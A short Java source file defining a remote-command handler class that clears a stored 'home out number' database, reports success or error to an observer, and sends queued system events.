package com.vvt.rmtcmd.pcc;

import com.vvt.global.Global;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.std.Constant;

public class PCCClearHomeOutNumb extends PCCRmtCmdSync {

	private SendEventManager eventSender = Global.getSendEventManager();
	
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		doPCCHeader(PhoenixCompliantCommand.CLEAR_HOMEOUT.getId());
		try {			
			clearHomeOutNumberDB();
			responseMessage.append(Constant.OK);
			observer.cmdExecutedSuccess(this);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		createSystemEventOut(responseMessage.toString());
		// To send events
		eventSender.sendEvents();
	}
}
